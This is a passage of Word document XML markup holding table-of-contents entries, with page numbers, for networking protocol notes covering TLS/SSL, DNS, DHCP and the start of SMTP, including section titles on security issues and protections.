        <w:p w14:paraId="686EEC07" w14:textId="715F61F1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408499" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>TLS/SSL (Transport Layer Security / Secure Sockets Layer)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408499 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0261C35B" w14:textId="109954DA" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408500" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How It Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408500 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7B90225E" w14:textId="1D617924" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408501" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>TLS Record Format:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408501 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="638365B6" w14:textId="73AB1E02" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408502" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Ports:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408502 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="42E1E7BC" w14:textId="6E72015D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408503" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408503 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F83F15C" w14:textId="1325C990" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408504" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408504 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="33CF3D00" w14:textId="71C2D85B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408505" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Domain Name System (DNS)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408505 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3063F61A" w14:textId="37EBB33C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408506" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Flowchart for DNS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408506 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="05E519C4" w14:textId="24BCACDA" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408507" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of DNS Records:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408507 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="411A3145" w14:textId="2EC01E21" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408508" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues &amp; Attacks</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408508 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="24E0FF55" w14:textId="01C2E3B1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408509" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408509 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="66B01C7E" w14:textId="6B6A54BE" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408510" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Dynamic Host Configuration Protocol (DHCP)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408510 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0D420BF5" w14:textId="1F32BE92" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408511" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How DHCP Works (DORA Process)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408511 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="39D164FC" w14:textId="50F35E0C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408512" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Parameters Provided by DHCP</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408512 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="311BED1E" w14:textId="77DC2556" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408513" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues &amp; Attacks</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408513 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="17645C03" w14:textId="08BAB2AA" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408514" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408514 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="002A96D7" w14:textId="22EF2FF6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408515" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Simple Mail Transfer Protocol (SMTP)</w:t>
            </w:r>
